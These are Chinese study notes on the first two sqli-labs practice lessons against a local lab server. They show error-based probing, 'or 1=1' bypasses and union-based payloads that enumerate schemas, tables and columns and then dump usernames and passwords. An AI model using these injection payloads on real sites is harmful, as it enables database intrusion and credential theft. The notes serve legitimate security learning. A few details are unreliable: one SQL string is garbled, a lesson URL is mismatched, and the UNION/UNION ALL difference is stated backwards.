###
sqli-labs 学习笔记

##
lession-1

我们可以在http://127.0.0.1/sqllib/Less-5/?id=1后面直接添加一个 '
我们可以看到提交到sql中的1'在经过sql语句构造后形成 '1'' LIMIT 0,1，多加了一个 ' 。这种方式就是从错误信息中得到我们所需要的信息，那我们接下来想如何将多余的 ' 去掉呢
尝试 'or 1=1--+
此时构造的sql语句就成了
Select ****** where id='1'or 1=1--+' LIMIT 0,1

最后从源代码中分析下为什么会造成注入？
Sql语句为sql="SELECT∗FROMusersWHEREid=′id' LIMIT 0,1";
Id参数在拼接sql语句时，未对id进行任何的过滤等操作，所以当提交 'or 1=1--+，直接构造的sql语句就是
SELECT * FROM users WHERE id='1'or 1=1--+ LIMIT 0,1
这条语句因or 1=1 所以为永恒真。

union联合注入，union的作用是将两个sql语句进行联合。Union可以从下面的例子中可以看出，强调一点：union前后的两个sql语句的选择列数要相同才可以。Union all与union 的区别是增加了去重的功能。我们这里根据上述background的知识，进行information_schema 知识的应用。
http://127.0.0.1/sqllib/Less-1/?id=-1'union select 1,2--+
当id的数据在数据库中不存在时，（此时我们可以id=-1，两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返回了我们构造的union 的数据。

爆数据库
http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+
此时的sql语句为SELECT * FROM users WHERE id='-1'union select 1,group_concat(schema_name),3 from information_schema.schemata--+ LIMIT 0,1

爆security数据库的数据表
http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
此时的sql语句为SELECT * FROM users WHERE id='-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ LIMIT 0,1

爆users表的列
http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27--+
此时的sql语句为SELECT * FROM users WHERE id='-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+ LIMIT 0,1

爆数据
http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,username,password%20from%20users%20where%20id=2--+
此时的sql语句为SELECT * FROM users WHERE id='-1'union select 1,username,password from users where id=2--+ LIMIT 0,1

##
我们又得到了一个Mysql返回的错误，提示我们语法错误。
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1′ at line 1
现在执行的查询语句如下：
Select * from TABLE where id = 1' ;
所以这里的奇数个单引号破坏了查询，导致抛出错误。
因此我们得出的结果是，查询代码使用了整数。
Select * from TABLE where id = (some integer value);
现在，从开发者的视角来看，为了对这样的错误采取保护措施，我们可以注释掉剩余的查询：
http://localhost/sqli-labs/Less-2/?id=1–-+

源代码中可以分析到SQL语句为下：
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
对id没有经过处理

可以成功注入的有：
or 1=1
or 1=1 --+
其余的payload与less1中一直，只需要将less1中的 ' 去掉即可。
